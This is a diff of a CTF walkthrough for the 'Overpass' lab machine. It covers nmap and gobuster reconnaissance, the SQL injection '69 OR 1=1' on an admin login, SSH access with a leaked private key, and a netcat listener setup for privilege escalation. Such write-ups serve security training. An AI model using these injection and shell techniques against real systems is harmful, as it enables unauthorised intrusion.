@@ -1,17 +1,10 @@
 # Overpass
 
-This room is pretty barebones in the questions, so we do everything from scratch!
-A good opportunity to test your skills ...
-
-### What happens when a group of broke Computer Science students try to make a password manager? Obviously a perfect commercial success!
-yay
-
-
-
 ## 1. Recon
-`❯ nmap -sC -sV -A BOX_IP`
 
+### 1.1 Port Scanning
 ```
+❯ nmap -sC -sV -A BOX_IP
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-02 22:56 EST
 Stats: 0:00:24 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
 Connect Scan Timing: About 49.58% done; ETC: 22:56 (0:00:23 remaining)
@@ -34,8 +27,13 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 91.19 seconds
 ```
 
-`❯ gobuster dir -u BOX_IP -w "/usr/share/wordlists/rockyou.txt" -x "html,php,txt"`
+PS: you can run this with `--script=vuln`, and that works too. But, it took this amount of time:
+`Nmap done: 1 IP address (1 host up) scanned in 1216.13 seconds`. So maybe not a good idea. 
+
+
+### 1.2 Web Enumeration
 ```
+❯ gobuster dir -u BOX_IP -w "/usr/share/wordlists/rockyou.txt" -x "html,php,txt"
 ===============================================================
 Gobuster v3.0.1
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
@@ -64,21 +62,20 @@ Progress: 1322 / 220561 (0.60%)^C
 ===============================================================
 ```
 
-PS: you can run this with `--script=vuln`, and that works too. But, it took this amount of time:
-`Nmap done: 1 IP address (1 host up) scanned in 1216.13 seconds`. So maybe not a good idea. 
-
-
-## 2. Foothold
-
+### 1.3 SQLI
 hmmm. admin look interesting. Using `/admin.html` gives us a login page.
 
-lets try an sql injection: `69 OR 1=1`
+lets try a basic sql injection: `69 OR 1=1`
 
 ...
 
 works!
 
-okay so name of the person is james and ... we have the ssh private key printed out lmao. lets try:
+okay so name of the person is james and ... we have the ssh private key printed out lmao.
+
+## 2. Foothold
+
+ lets try:
 
 `❯ ssh -i key james@BOX_IP`
 
@@ -109,18 +106,11 @@ Session completed
 ```
 key hidden :)
 
-
-### Hack the machine and get the flag in user.txt 
-
 ```
 ❯ ssh -i key james@BOX_IP
 Enter passphrase for key 'key': 
 ```
 I'm in!
-
-`james@overpass-prod:~$ cat user.txt`
-
-:stonks:
 
 ## 3. PrivEsc
 ```
@@ -211,7 +201,4 @@ Meanwhile, setup netcat using:
 - -v: verbose [use twice to be more verbose]
 - -p port: local port number
 
-and we are in!
-
-### Escalate your privileges and get the flag in root.txt
-PWNED 1337
+and we are all in!
